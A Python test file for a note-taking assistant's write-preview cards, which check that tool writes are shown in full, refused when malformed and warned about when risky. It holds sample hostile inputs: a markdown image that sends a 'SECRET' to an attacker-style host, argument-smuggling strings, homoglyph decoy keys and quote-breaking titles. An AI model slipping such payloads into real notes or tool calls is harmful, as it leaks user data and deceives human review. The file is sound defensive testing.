import asyncio
import inspect
import json
import subprocess
import sys
import typing
from collections.abc import Mapping
from types import SimpleNamespace

import pytest
from pydantic.fields import FieldInfo

from pkm import batch as batch_module
from pkm.assistant import write_preview as wp_module
from pkm.assistant.policy import WRITE_PREVIEW_FIELDS, WRITE_TOOLS
from pkm.assistant.write_preview import (CONTENT_LIMIT_CHARS,
                                         TARGET_LIMIT_CHARS,
                                         CreatedInBatch, FoundBlock,
                                         MissingBlock, PreviewOp, Refusal,
                                         StoredBlock, WritePreview,
                                         ancestor_uids,
                                         build_write_preview,
                                         delete_target_uids,
                                         write_target_uids)
from pkm.contracts.ops import BlockUid
from pkm.contracts.titles import RawTitle
from pkm.mcp import server as mcp_server
from pkm.mcp import tools as mcp_tools
from pkm.test_data.ids import (canonical_title_of, malformed_uid,
                               raw_title_of, uid_of)


def _preview(short: str, raw: Mapping[str, object],
             blocks: Mapping[BlockUid, StoredBlock] = {}) -> WritePreview:
    out = build_write_preview(short, raw, blocks)
    assert isinstance(out, WritePreview), out
    return out


def _refusal(short: str, raw: Mapping[str, object],
             blocks: Mapping[BlockUid, StoredBlock] = {}) -> Refusal:
    out = build_write_preview(short, raw, blocks)
    assert isinstance(out, Refusal), out
    return out


def test_targets_come_first_and_content_is_sent_in_full():
    p = _preview("update_block", {"text": "x" * 10_000,
                                  "uid": "VICTIMUID01"})
    op = p.ops[0]
    assert op.action == "update block"
    assert op.targets[0] == ("uid", "VICTIMUID01")
    assert op.content[0] == ("text", "x" * 10_000, 10_000)


def test_content_tail_reaches_the_card():
    # past the old 2000-character clip: an image fetching an attacker URL
    hidden = "![](https://evil.example/x?d=SECRET)"
    p = _preview("save_note", {"text": "ok\n" * 1000 + hidden})
    ((_, shown, total),) = p.ops[0].content
    assert shown.endswith(hidden) and total == len(shown)


def test_content_at_the_limit_is_previewed():
    assert CONTENT_LIMIT_CHARS == 50_000
    p = _preview("save_note", {"text": "x" * CONTENT_LIMIT_CHARS})
    assert p.ops[0].content[0][2] == CONTENT_LIMIT_CHARS


@pytest.mark.parametrize(("short", "raw", "message"), [
    ("save_note", {"text": "x" * 50_001},
     "save_note: text is 50001 characters; split the write into parts "
     "under 50000"),
    ("update_block", {"uid": "U1", "text": "x" * 60_000},
     "update_block: text is 60000 characters; split the write into parts "
     "under 50000"),
    ("batch", {"commands": [
        {"command": "delete", "params": {"uid": "U1"}},
        {"command": "outline", "params": {"page": "P",
                                          "items": ["x" * 50_001]}}]},
     "batch item 1: items is 50001 characters; split the write into parts "
     "under 50000"),
])
def test_content_over_the_limit_is_refused(short, raw, message):
    assert _refusal(short, raw).message == message


def test_batch_params_never_clip_a_uid():
    uid = "VICTIM" + "u" * 300
    p = _preview("batch", {"commands": [
        {"command": "update", "params": {"text": "y" * 5000, "uid": uid}}]})
    op = p.ops[0]
    assert op.action == "update block"
    assert op.targets == [("uid", uid)]
    assert op.content == [("text", "y" * 5000, 5000)]


_THREE = [
    {"command": "move", "params": {"uid": "MOVEME", "page": "Inbox"}},
    {"command": "delete", "params": {"uid": "GONE"}},
    {"command": "create", "params": {"page": "Inbox", "text": "hi"}},
]


def test_string_encoded_commands_preview_like_the_list():
    as_list = _preview("batch", {"commands": _THREE})
    as_text = _preview("batch", {"commands": json.dumps(_THREE)})
    assert as_text == as_list
    assert [op.action for op in as_list.ops] == [
        "move block", "delete block", "create block"]
    assert as_list.summary == "batch: 3 ops (move, delete, create)"
    assert as_list.ops[0].targets == [
        ("uid", "MOVEME"), ("page", "Inbox"), ("parent", None),
        ("index", None)]


@pytest.mark.parametrize(("commands", "needle"), [
    ("nope", "commands"),
    ([], "no commands"),
    ([{"command": "drop", "params": {}}], 'unknown command: "drop"'),
    ([{"command": "delete"}], "params"),
])
def test_non_list_or_malformed_batch_is_refused(commands, needle):
    r = _refusal("batch", {"commands": commands})
    assert needle in r.message


def test_bad_batch_item_names_its_index():
    r = _refusal("batch", {"commands": [
        {"command": "delete", "params": {"uid": "A"}},
        {"command": "delete", "params": {"uid": ""}}]})
    assert r.message.startswith("batch item 1: params.uid:")


def test_a_reused_alias_is_refused():
    cmd = {"command": "create",
           "params": {"page": "P", "text": "t", "as": "x"}}
    r = _refusal("batch", {"commands": [cmd, cmd]})
    assert r.message.startswith('batch item 1: as "x" already names')


def test_fake_argument_list_stays_one_value():
    text = "x), uid=SAFE, page=Inbox"
    p = _preview("save_note", {"text": text})
    op = p.ops[0]
    assert op.content == [("text", text, len(text))]
    assert op.targets == [("page", None), ("parent", None), ("todo", False)]


@pytest.mark.parametrize("value", ["true", "yes", 1, True])
def test_allow_merge_coerced_values_warn(value):
    p = _preview("rename_page", {"title": "Inbox", "new_title": "Projects",
                                 "allow_merge": value})
    op = p.ops[0]
    assert ("allow_merge", True) in op.targets
    assert op.warnings == [
        'allow_merge is on: if "Projects" exists, "Inbox" is merged into '
        'it (irreversible)']


def test_allow_merge_off_has_no_warning():
    p = _preview("rename_page", {"title": "Inbox", "new_title": "Projects"})
    assert p.ops[0].targets == [("title", "Inbox"), ("new_title", "Projects"),
                                ("allow_merge", False)]
    assert p.ops[0].warnings == []


def test_allow_merge_unreadable_value_is_refused():
    r = _refusal("rename_page", {"title": "Inbox", "new_title": "Projects",
                                 "allow_merge": "maybe"})
    assert "allow_merge" in r.message


def test_page_null_string_previews_as_received():
    p = _preview("save_note", {"text": "t", "page": "null"})
    assert p.ops[0].targets[0] == ("page", None)
    r = _refusal("save_note", {"text": "t", "page": "[1]"})
    assert "page" in r.message


@pytest.mark.parametrize("parent", ["{{a}}", "((abc))"])
def test_alias_and_uid_parents_shown_verbatim(parent):
    p = _preview("batch", {"commands": [
        {"command": "create",
         "params": {"page": "P", "text": "t", "as": "a"}},
        {"command": "create",
         "params": {"page": "P", "text": "t", "parent": parent}}]})
    assert ("parent", parent) in p.ops[1].targets


@pytest.mark.parametrize(("short", "raw", "key"), [
    # a Cyrillic i: the tool ignores this key, so a card row for it would
    # be a decoy uid beside the real one
    ("update_block", {"uid": "IMPORTANT01", "text": "x",
                      "u\u0456d": "junk123"}, "u\u0456d"),
    ("save_note", {"text": "t", "extra": "z"}, "extra"),
    # batch's only argument is `commands`; a `uid` beside it is ignored
    ("batch", {"commands": [{"command": "delete",
                             "params": {"uid": "IMPORTANT01"}}],
               "uid": "junk123"}, "uid"),
    ("batch", {"commands": [{"command": "create",
                             "params": {"page": "Secret", "text": "x"}}],
               "page": None}, "page"),
])
def test_unknown_key_is_refused(short, raw, key):
    r = _refusal(short, raw)
    assert r.message == f"{short}: unknown argument {json.dumps(key)}"


@pytest.mark.parametrize("brk", ["\n", "\r", "\u2028", "\u2029", "\x85"])
def test_unknown_key_refusal_is_one_line(brk):
    r = _refusal("save_note", {"text": "t", f"x{brk}fake": 1})
    assert len(r.message.splitlines()) == 1


def test_a_declared_alias_is_not_unknown(monkeypatch):
    from mcp.server.fastmcp.utilities.func_metadata import func_metadata

    from pkm.assistant import write_preview
    monkeypatch.setitem(write_preview.WRITE_PREVIEW_FIELDS, "stub",
                        ("stub", ("json",), ("text",)))
    monkeypatch.setitem(write_preview._ARG_MODELS, "stub",
                        func_metadata(_stub_tool))
    assert isinstance(build_write_preview("stub", {"text": "t", "json": "P"}, {}),
                      WritePreview)
    assert isinstance(build_write_preview("stub", {"text": "t",
                                                   "field_json": "P"}, {}),
                      WritePreview)


def test_a_declared_field_the_table_misses_is_still_a_target(monkeypatch):
    from pkm.assistant import write_preview
    monkeypatch.setitem(write_preview.WRITE_PREVIEW_FIELDS, "save_note",
                        ("save note", ("page",), ("text",)))
    p = _preview("save_note", {"text": "t", "parent": "## Log"})
    assert p.ops[0].targets == [("page", None), ("parent", "## Log"),
                                ("todo", False)]


_ALIAS_WARNING = ('parent "{{x}}" is the block write 1 creates as "x": '
                  'this lands under it, on that block\'s page, whatever '
                  'the page row says')
_UID_WARNING = ('parent "((abcdef01))" must be a block on the page shown, '
                'or nothing is written')


@pytest.mark.parametrize("command", ["create", "todo", "outline", "move"])
def test_alias_parent_warns_the_page_row_does_not_place_it(command):
    params: dict[str, object] = {"page": "Inbox", "parent": "{{x}}"}
    params |= ({"items": ["a"]} if command == "outline"
               else {"uid": "MOVEME"} if command == "move" else {"text": "b"})
    p = _preview("batch", {"commands": [
        {"command": "create", "params": {"page": "Secret", "text": "a",
                                         "as": "x"}},
        {"command": command, "params": params}]})
    assert p.ops[0].warnings == []
    assert _ALIAS_WARNING in p.ops[1].warnings


@pytest.mark.parametrize(("short", "raw"), [
    ("save_note", {"text": "t", "parent": "((abcdef01))"}),
    ("batch", {"commands": [{"command": "create", "params": {
        "page": "P", "text": "t", "parent": "((abcdef01))"}}]}),
    ("batch", {"commands": [{"command": "outline", "params": {
        "page": "P", "items": ["a"], "parent": "((abcdef01))"}}]}),
    ("batch", {"commands": [{"command": "move", "params": {
        "uid": "MOVEME", "page": "P", "parent": "((abcdef01))"}}]}),
])
def test_uid_parent_warns_it_must_be_on_the_page_shown(short, raw):
    assert _UID_WARNING in _preview(short, raw).ops[0].warnings


def test_alias_parent_outside_batch_warns_nothing_is_written():
    p = _preview("save_note", {"text": "t", "parent": "{{x}}"})
    assert p.ops[0].warnings == [
        'parent "{{x}}" is an alias, which only batch knows: nothing is '
        'written']


def test_heading_parent_has_no_warning():
    p = _preview("save_note", {"text": "t", "parent": "## Log"})
    assert p.ops[0].warnings == []


def test_batch_update_and_move_warn_where_a_missing_uid_goes():
    p = _preview("batch", {"commands": [
        {"command": "update", "params": {"uid": "GONE01", "text": "t"}},
        {"command": "move", "params": {"uid": "GONE02", "page": "P"}},
        {"command": "create", "params": {"page": "P", "text": "a",
                                         "as": "x"}},
        {"command": "update", "params": {"uid": "{{x}}", "text": "t"}}]})
    assert p.ops[0].warnings == [
        'if no block has uid "GONE01", nothing is updated and the text is '
        "added to today's daily note instead"]
    assert p.ops[1].warnings == [
        'if no block has uid "GONE02", nothing moves and a note saying so '
        "is added to today's daily note"]
    # an alias names a block this batch creates, so it exists
    assert p.ops[3].warnings == []


def test_the_parent_warnings_match_the_planner():
    """The warnings above describe `plan_batch` and `plan_save`: an alias
    parent lands under the created block whatever `page` says, and a
    `((uid))` not on the page fails planning, before any write."""
    from pkm.batch import plan_batch
    from pkm.contracts.ops import CreateOp, MoveOp
    from pkm.planning import BuildError, plan_save
    uids = iter(uid_of(f"NEWUID{i:04d}") for i in range(10))
    ops = plan_batch([
        {"command": "create", "params": {"page": "Secret", "text": "a",
                                         "as": "x"}},
        {"command": "create", "params": {"page": "Inbox", "text": "b",
                                         "parent": "{{x}}"}},
        {"command": "move", "params": {"uid": "MOVEME", "page": "Inbox",
                                       "parent": "{{x}}"}}],
        {"Secret": [], "Inbox": []}, uids=uids)
    first, second, move = ops
    assert isinstance(first, CreateOp) and isinstance(second, CreateOp)
    assert second.parent_uid == first.uid
    assert isinstance(move, MoveOp)
    assert move.parent_uid == first.uid and move.page_title is None
    with pytest.raises(BuildError, match="block not on page"):
        plan_batch([{"command": "create", "params": {
            "page": "Inbox", "text": "b", "parent": "((abcdef01))"}}],
            {"Inbox": []}, uids=uids)
    with pytest.raises(BuildError, match="block not on page"):
        plan_save([], raw_title_of("Inbox"), "((abcdef01))", "b", False,
                  uids=uids)
    with pytest.raises(BuildError, match="unrecognized parent spec"):
        plan_save([], raw_title_of("Inbox"), "{{x}}", "b", False, uids=uids)


def test_outline_items_render_as_indented_text():
    p = _preview("batch", {"commands": [
        {"command": "outline",
         "params": {"page": "P", "items": ["a", ["b", ["c"]]]}}]})
    op = p.ops[0]
    assert op.action == "add outline"
    assert op.content == [("items", "a\n  b\n    c", len("a\n  b\n    c"))]


def test_update_block_mark_only_has_no_content():
    p = _preview("update_block", {"uid": "U1", "mark": "DONE"})
    assert p.ops[0].targets == [("uid", "U1"), ("mark", "DONE")]
    assert p.ops[0].content == []


def test_deep_outline_nest_is_refused_not_raised(caplog):
    items: list[object] = ["leaf"]
    for _ in range(sys.getrecursionlimit() + 50):
        items = [items]
    r = build_write_preview("batch", {"commands": [
        {"command": "outline", "params": {"page": "P", "items": items}}]},
        {})
    assert r == Refusal("batch: input could not be previewed")


def test_a_preview_failure_logs_its_type_only(monkeypatch, caplog):
    from pkm.assistant import write_preview

    def boom(*_args):
        raise KeyError("attacker\ntext")
    monkeypatch.setattr(write_preview, "_op", boom)
    with caplog.at_level("WARNING", logger="pkm.assistant"):
        r = build_write_preview("save_note", {"text": "t"}, {})
    assert r == Refusal("save_note: input could not be previewed")
    assert [rec.levelname for rec in caplog.records] == ["WARNING"]
    assert "KeyError" in caplog.text
    assert "attacker" not in caplog.text


def test_target_at_the_limit_is_previewed():
    assert TARGET_LIMIT_CHARS == 1000
    uid = "u" * TARGET_LIMIT_CHARS
    assert _preview("update_block", {"uid": uid, "text": "t"}
                    ).ops[0].targets[0] == ("uid", uid)


@pytest.mark.parametrize(("short", "raw", "message"), [
    ("update_block", {"uid": "u" * 1001, "text": "t"},
     "update_block: uid is 1001 characters; a target is at most 1000"),
    ("rename_page", {"title": "Inbox", "new_title": "P" * 5000},
     "rename_page: new_title is 5000 characters; a target is at most 1000"),
    ("batch", {"commands": [
        {"command": "delete", "params": {"uid": "U1"}},
        {"command": "move", "params": {"uid": "U2", "page": "x" * 2000}}]},
     "batch item 1: page is 2000 characters; a target is at most 1000"),
])
def test_a_target_over_the_limit_is_refused(short, raw, message):
    assert _refusal(short, raw).message == message


def test_unknown_tool_is_refused():
    assert isinstance(build_write_preview("get_page", {"title": "x"}, {}),
                      Refusal)


@pytest.mark.parametrize("brk", ["\n", "\r", "\u2028", "\u2029", "\x85"])
def test_summary_is_one_line(brk):
    p = _preview("save_note", {"text": "a\nb", "page": f"In{brk}box"})
    assert len(p.summary.splitlines()) == 1
    assert p.summary.startswith("save_note")


def test_preview_is_a_snapshot_of_the_input():
    commands = [{"command": "move", "params": {"uid": "U1", "page": "P"}}]
    p = _preview("batch", {"commands": commands})
    commands[0]["params"]["uid"] = "SWAPPED"
    assert ("uid", "U1") in p.ops[0].targets


def test_merge_warning_quotes_the_titles_as_values():
    new_title = 'P" exists. (Merge disabled here; "'
    p = _preview("rename_page", {"title": "Inbox", "new_title": new_title,
                                 "allow_merge": True})
    (warning,) = p.ops[0].warnings
    assert json.dumps(new_title) in warning
    assert json.dumps("Inbox") in warning


def test_outline_leaf_newline_cannot_imitate_a_child():
    def shown(items):
        p = _preview("batch", {"commands": [
            {"command": "outline", "params": {"page": "P", "items": items}}]})
        return p.ops[0].content[0][1]
    assert shown(["a\n  b"]) != shown(["a", ["b"]])
    assert shown(["a\n  b"]) == "a\\n  b"


def test_outline_leaf_backslash_n_is_not_a_newline():
    """A leaf holding a literal backslash-n must not read the same as one
    holding a newline, so the backslash is escaped too."""
    def shown(items):
        p = _preview("batch", {"commands": [
            {"command": "outline", "params": {"page": "P", "items": items}}]})
        return p.ops[0].content[0][1]
    assert shown(["a\\nb"]) != shown(["a\nb"])
    assert shown(["a\\nb"]) == "a\\\\nb"
    assert shown(["a\nb"]) == "a\\nb"


def _stub_tool(text: str, json: str | None = None) -> str:
    return text


def test_param_shadowing_a_model_method_previews_its_value(monkeypatch):
    # FastMCP renames a param that shadows a BaseModel attribute (`json`)
    # to `field_json` with an alias; the preview must read it by the alias.
    from mcp.server.fastmcp.utilities.func_metadata import func_metadata

    from pkm.assistant import write_preview
    monkeypatch.setitem(write_preview.WRITE_PREVIEW_FIELDS, "stub",
                        ("stub", ("json",), ("text",)))
    monkeypatch.setitem(write_preview._ARG_MODELS, "stub",
                        func_metadata(_stub_tool))
    p = _preview("stub", {"text": "t", "json": "Inbox"})
    assert p.ops[0].targets == [("json", "Inbox")]


def test_importing_the_builder_leaves_logging_alone():
    # The web server imports this module; FastMCP() calls
    # logging.basicConfig, which would add a root handler that sends every
    # library's INFO lines to production's stderr file.
    probe = ("import logging\n"
             "root = logging.getLogger()\n"
             "before = (list(root.handlers), root.level)\n"
             "import pkm.assistant.write_preview\n"
             "after = (list(root.handlers), root.level)\n"
             "print(before == after, before, after)\n")
    out = subprocess.run([sys.executable, "-I", "-c", probe],
                         capture_output=True, text=True, check=True)
    assert out.stdout.startswith("True"), out.stdout + out.stderr


def _wire_name(name: str, field: FieldInfo) -> str:
    return field.alias or name


def _batch_params_models() -> dict[str, type]:
    union = typing.get_args(batch_module.BatchCommand)[0]
    out: dict[str, type] = {}
    for cmd in typing.get_args(union):
        (tag,) = typing.get_args(cmd.model_fields["command"].annotation)
        out[tag] = cmd.model_fields["params"].annotation
    return out


def test_every_tool_field_is_classified():
    batch_params = inspect.signature(mcp_tools.batch).parameters
    assert set(batch_params) == {"commands"}
    for short in WRITE_TOOLS:
        if short == "batch":
            continue
        _, targets, content = WRITE_PREVIEW_FIELDS[short]
        params = set(inspect.signature(getattr(mcp_tools, short)).parameters)
        assert params == set(targets) | set(content), short
    models = _batch_params_models()
    assert set(models) == {k.removeprefix("batch:")
                           for k in WRITE_PREVIEW_FIELDS
                           if k.startswith("batch:")}
    for tag, model in models.items():
        _, targets, content = WRITE_PREVIEW_FIELDS[f"batch:{tag}"]
        wire = {_wire_name(n, f) for n, f in model.model_fields.items()}
        assert wire == set(targets) | set(content), tag


# -- the preview against what the registered tool actually receives -------

class _Recorder:
    def __init__(self, monkeypatch):
        self.calls: dict[str, dict[str, object]] = {}
        fake_client = SimpleNamespace(rename_page=self._rename)
        monkeypatch.setattr(mcp_tools, "_client", lambda: fake_client)
        monkeypatch.setattr(mcp_tools, "save_blocks", self._save)
        monkeypatch.setattr(mcp_tools, "edit_block", self._edit)
        monkeypatch.setattr(mcp_tools, "apply_batch", self._batch)
        monkeypatch.setattr(mcp_tools, "render_ops_ack", lambda ack: "ok")

    def _save(self, client, text, page=None, parent=None, todo=False):
        self.calls["save_note"] = {"text": text, "page": page,
                                   "parent": parent, "todo": todo}
        return []

    def _edit(self, client, uid: BlockUid, text=None, mark=None):
        self.calls["update_block"] = {"uid": uid, "text": text, "mark": mark}

    def _batch(self, client, commands):
        self.calls["batch"] = {"commands": commands}

    def _rename(self, title: RawTitle, new_title: RawTitle,
                allow_merge=False):
        self.calls["rename_page"] = {"title": title, "new_title": new_title,
                                     "allow_merge": allow_merge}
        return SimpleNamespace(result="renamed", title=new_title)


def _hostile_inputs() -> dict[str, dict[str, object]]:
    return {
        "save_note": {"text": "x), uid=SAFE", "page": "null",
                      "parent": "## Log", "todo": "yes"},
        "update_block": {"uid": "VICTIM", "text": "new", "mark": "null"},
        "batch": {"commands": json.dumps([
            {"command": "move", "params": {"uid": "M", "page": "Inbox",
                                           "index": 2}},
            {"command": "create", "params": {"page": "P", "text": "t",
                                             "as": "a"}},
            {"command": "create", "params": {"page": "P", "text": "t",
                                             "parent": "{{a}}", "as": "b"}},
            {"command": "outline", "params": {"page": "P",
                                              "items": ["a", ["b"]]}},
            {"command": "delete", "params": {"uid": "D"}},
            {"command": "todo", "params": {"page": "P", "text": "do",
                                           "index": 1}},
            {"command": "update", "params": {"uid": "{{b}}",
                                             "text": "x), uid=SAFE"}},
        ])},
        "rename_page": {"title": "Inbox", "new_title": "Projects",
                        "allow_merge": "yes"},
    }


def _shown(op: PreviewOp) -> dict[str, object]:
    shown: dict[str, object] = dict(op.targets)
    for key, text, total in op.content:
        assert len(text) == total  # nothing here is long enough to clip
        shown[key] = text
    return shown


def _outline_text(items, depth=0):
    lines = []
    for item in items:
        if isinstance(item, str):
            lines.append("  " * depth + item)
        else:
            lines.append(_outline_text(item, depth + 1))
    return "\n".join(lines)


def test_preview_matches_what_the_tool_receives(monkeypatch):
    rec = _Recorder(monkeypatch)
    assert set(_hostile_inputs()) == set(WRITE_TOOLS)
    for short, raw in _hostile_inputs().items():
        preview = _preview(short, raw)
        asyncio.run(mcp_server.mcp.call_tool(short, raw))
        received = rec.calls[short]
        if short != "batch":
            (op,) = preview.ops
            assert _shown(op) == received, short
            continue
        # what apply_batch runs: the commands as validate_batch reads them
        commands = batch_module.validate_batch(received["commands"])
        assert len(preview.ops) == len(commands)
        for op, command in zip(preview.ops, commands):
            label, _, _ = WRITE_PREVIEW_FIELDS[f"batch:{command.command}"]
            assert op.action == label
            params = command.params.model_dump(mode="json", by_alias=True)
            if "items" in params:
                params["items"] = _outline_text(params["items"])
            assert _shown(op) == params
    assert rec.calls["save_note"]["page"] is None
    assert rec.calls["rename_page"]["allow_merge"] is True


# -- the current text of the block a write replaces, moves or deletes ------

_A = uid_of("AAAAAAAA")
_B = uid_of("BBBBBBBB")
_VICTIM = uid_of("VICTIMUID01")
_INBOX = canonical_title_of("Inbox")


def test_update_block_shows_the_current_text_and_page():
    p = _preview("update_block", {"uid": _VICTIM, "text": "new"},
                 {_VICTIM: StoredBlock(_INBOX, "old text")})
    assert p.ops[0].current == FoundBlock(_INBOX, "old text", 8)


def test_current_text_is_an_excerpt_with_the_whole_length():
    raw = {"uid": _VICTIM, "text": "new"}
    long = _preview("update_block", raw,
                    {_VICTIM: StoredBlock(_INBOX, "y" * 1000)})
    assert long.ops[0].current == FoundBlock(_INBOX, "y" * 200, 1000)
    exact = _preview("update_block", raw,
                     {_VICTIM: StoredBlock(_INBOX, "y" * 200)})
    assert exact.ops[0].current == FoundBlock(_INBOX, "y" * 200, 200)


def test_excerpt_counts_code_points():
    p = _preview("update_block", {"uid": _VICTIM, "text": "new"},
                 {_VICTIM: StoredBlock(_INBOX, "\U0001F600" * 300)})
    assert p.ops[0].current == FoundBlock(_INBOX, "\U0001F600" * 200, 300)


def test_a_uid_no_block_has_is_missing():
    p = _preview("update_block", {"uid": _VICTIM, "text": "new"}, {})
    assert p.ops[0].current == MissingBlock()


def test_a_malformed_uid_is_missing_and_never_read():
    raw = {"commands": [{"command": "delete", "params": {"uid": "((abc))"}}]}
    assert write_target_uids("batch", raw) == []
    # a block stored under the raw spec must not be found by it
    p = _preview("batch", raw,
                 {malformed_uid("((abc))"): StoredBlock(_INBOX, "t")})
    assert p.ops[0].current == MissingBlock()


def test_update_block_braces_are_not_an_alias():
    p = _preview("update_block", {"uid": "{{x}}", "text": "new"})
    assert p.ops[0].current == MissingBlock()


def test_batch_alias_target_names_the_creating_write():
    p = _preview("batch", {"commands": [
        {"command": "create", "params": {"page": "P", "text": "a",
                                         "as": "n"}},
        {"command": "create", "params": {"page": "P", "text": "b",
                                         "as": "m"}},
        {"command": "update", "params": {"uid": "{{m}}", "text": "c"}}]})
    assert p.ops[2].current == CreatedInBatch(write=2, alias="m")


def test_one_uid_updated_moved_and_deleted_shows_one_text():
    raw = {"commands": [
        {"command": "update", "params": {"uid": _A, "text": "t"}},
        {"command": "move", "params": {"uid": _A, "page": "P"}},
        {"command": "delete", "params": {"uid": _A}}]}
    assert write_target_uids("batch", raw) == [_A]
    p = _preview("batch", raw, {_A: StoredBlock(_INBOX, "old")})
    found = FoundBlock(_INBOX, "old", 3)
    assert [op.current for op in p.ops] == [found, found, found]


def test_write_target_uids_skips_parents_and_creates():
    raw = {"commands": [
        {"command": "update", "params": {"uid": _A, "text": "t"}},
        {"command": "move", "params": {"uid": _B, "page": "P",
                                       "parent": "((CCCCCC))"}},
        {"command": "delete", "params": {"uid": _A}},
        {"command": "create", "params": {"page": "P", "text": "t"}}]}
    assert write_target_uids("batch", raw) == [_A, _B]


def test_delete_target_uids_names_only_deletes():
    raw = {"commands": [
        {"command": "update", "params": {"uid": _A, "text": "t"}},
        {"command": "move", "params": {"uid": _A, "page": "P"}},
        {"command": "delete", "params": {"uid": _B}},
        {"command": "delete", "params": {"uid": _B}},
        {"command": "delete", "params": {"uid": "((abc))"}},
        {"command": "create", "params": {"page": "P", "text": "t",
                                         "as": "n"}},
        {"command": "delete", "params": {"uid": "{{n}}"}}]}
    assert delete_target_uids("batch", raw) == [_B]
    assert set(delete_target_uids("batch", raw)) <= set(
        write_target_uids("batch", raw))
    assert delete_target_uids("update_block", {"uid": _A, "text": "t"}) == []
    assert delete_target_uids("batch", {"commands": "nope"}) == []


def test_delete_target_uids_never_raises(monkeypatch):
    from pkm.assistant import write_preview

    def boom(*_args):
        raise KeyError("x")
    monkeypatch.setattr(write_preview, "_validate", boom)
    raw = {"commands": [{"command": "delete", "params": {"uid": _A}}]}
    assert delete_target_uids("batch", raw) == []


def test_a_delete_shows_how_many_blocks_go_with_it():
    raw = {"commands": [
        {"command": "update", "params": {"uid": _A, "text": "t"}},
        {"command": "move", "params": {"uid": _A, "page": "P"}},
        {"command": "delete", "params": {"uid": _A}}]}
    p = _preview("batch", raw, {_A: StoredBlock(_INBOX, "old", 5)})
    # only the delete removes the blocks under it
    assert [op.current for op in p.ops] == [
        FoundBlock(_INBOX, "old", 3), FoundBlock(_INBOX, "old", 3),
        FoundBlock(_INBOX, "old", 3, 5)]


def test_update_block_never_shows_a_count():
    p = _preview("update_block", {"uid": _A, "text": "t"},
                 {_A: StoredBlock(_INBOX, "old", 5)})
    assert p.ops[0].current == FoundBlock(_INBOX, "old", 3)


def test_write_target_uids_of_update_block():
    assert write_target_uids("update_block",
                             {"uid": _VICTIM, "text": "t"}) == [_VICTIM]


@pytest.mark.parametrize(("short", "raw"), [
    ("batch", {"commands": "nope"}),
    ("update_block", {"uid": _VICTIM, "text": "t", "extra": "z"}),
    ("rename_page", {"title": "Inbox", "new_title": "Projects"}),
    ("get_page", {"title": "Inbox"}),
])
def test_write_target_uids_of_refused_input_is_empty(short, raw):
    assert write_target_uids(short, raw) == []


def test_write_target_uids_never_raises(monkeypatch):
    from pkm.assistant import write_preview

    def boom(*_args):
        raise KeyError("x")
    monkeypatch.setattr(write_preview, "_validate", boom)
    assert write_target_uids("update_block",
                             {"uid": _VICTIM, "text": "t"}) == []


def test_ops_that_touch_no_existing_block_have_no_current():
    blocks = {_A: StoredBlock(_INBOX, "old")}
    assert _preview("save_note", {"text": "t", "parent": f"(({_A}))"},
                    blocks).ops[0].current is None
    assert _preview("rename_page", {"title": "Inbox", "new_title": "P"},
                    blocks).ops[0].current is None
    p = _preview("batch", {"commands": [
        {"command": "create", "params": {"page": "P", "text": "t",
                                         "parent": f"(({_A}))"}},
        {"command": "todo", "params": {"page": "P", "text": "t"}},
        {"command": "outline", "params": {"page": "P", "items": ["a"],
                                          "parent": f"(({_A}))"}}]},
        blocks)
    assert [op.current for op in p.ops] == [None, None, None]


def test_a_long_page_title_on_the_current_block_is_refused():
    blocks = {_VICTIM: StoredBlock(canonical_title_of("t" * 1001), "old")}
    r = _refusal("update_block", {"uid": _VICTIM, "text": "t"}, blocks)
    assert "page title is 1001 characters" in r.message
    assert r.message == ("update_block: the block's page title is 1001 "
                         "characters; a target is at most 1000")
    title = canonical_title_of("t" * 1000)
    p = _preview("update_block", {"uid": _VICTIM, "text": "t"},
                 {_VICTIM: StoredBlock(title, "old")})
    assert p.ops[0].current == FoundBlock(title, "old", 3)


def _uid_stub_tool(uid: BlockUid) -> str:
    return uid


def test_a_uid_outside_the_current_text_entries_is_not_read(monkeypatch):
    # a write whose `uid` names a block it does not replace, move or
    # delete gets no current-text row, so its uid is not read
    from mcp.server.fastmcp.utilities.func_metadata import func_metadata

    from pkm.assistant import write_preview
    monkeypatch.setitem(write_preview.WRITE_PREVIEW_FIELDS, "stub",
                        ("stub", ("uid",), ()))
    monkeypatch.setitem(write_preview._ARG_MODELS, "stub",
                        func_metadata(_uid_stub_tool))
    assert write_target_uids("stub", {"uid": _A}) == []
    p = _preview("stub", {"uid": _A}, {_A: StoredBlock(_INBOX, "old")})
    assert p.ops[0].current is None


def test_unknown_key_refusal_is_bounded():
    r = _refusal("save_note", {"text": "t", "k" * 2_000_000: 1})
    assert len(r.message) < 200
    assert r.message.endswith("… (2,000,000 characters)")


def test_an_unknown_command_is_echoed_bounded():
    r = _refusal("batch", {"commands": [
        {"command": "z" * 1_000_000, "params": {}}]})
    assert len(r.message) < 200
    assert "… (1,000,000 characters)" in r.message


def test_an_extra_param_key_is_echoed_bounded():
    r = _refusal("batch", {"commands": [
        {"command": "delete", "params": {"uid": "A", "k" * 1_000_000: 1}}]})
    assert len(r.message) < 200
    assert "… (1,000,000 characters)" in r.message


def _deletes(n: int) -> dict[str, object]:
    return {"commands": [{"command": "delete", "params": {"uid": "A"}}
                         for _ in range(n)]}


def test_a_batch_over_the_op_limit_is_refused():
    r = _refusal("batch", _deletes(501))
    assert "501 commands" in r.message
    assert len(_preview("batch", _deletes(500)).ops) == 500


def _updates(n: int) -> dict[str, object]:
    return {"commands": [
        {"command": "update", "params": {"uid": f"UPD{i:08d}",
                                         "text": "t" * 50_000}}
        for i in range(n)]}


def test_a_card_over_the_size_limit_is_refused():
    r = _refusal("batch", _updates(6))
    assert "the card would hold 300," in r.message
    assert len(_preview("batch", _updates(4)).ops) == 4


def test_current_text_counts_toward_the_card_size(monkeypatch):
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 250)
    r = _refusal("update_block", {"uid": _VICTIM, "text": "t" * 60},
                 {_VICTIM: StoredBlock(_INBOX, "y" * 400)})
    assert "the card would hold" in r.message


def test_a_deletes_count_counts_toward_the_card_size(monkeypatch):
    # uid 8 + title 5 + excerpt 3 + the count's 5 digits
    monkeypatch.setattr(wp_module, "PREVIEW_LIMIT_CHARS", 20)
    raw = {"commands": [{"command": "delete", "params": {"uid": _A}}]}
    r = _refusal("batch", raw, {_A: StoredBlock(_INBOX, "old", 12345)})
    assert "the card would hold 21 characters" in r.message
    assert _preview("batch", raw, {_A: StoredBlock(_INBOX, "old", 1234)})


def test_current_page_titles_and_excerpts_count_toward_the_card_size():
    uids = [uid_of(f"TITLE{i:06d}") for i in range(500)]
    title = canonical_title_of("t" * 900)
    blocks = {u: StoredBlock(title, "y" * 200) for u in uids}
    raw = {"commands": [{"command": "delete", "params": {"uid": u}}
                        for u in uids]}
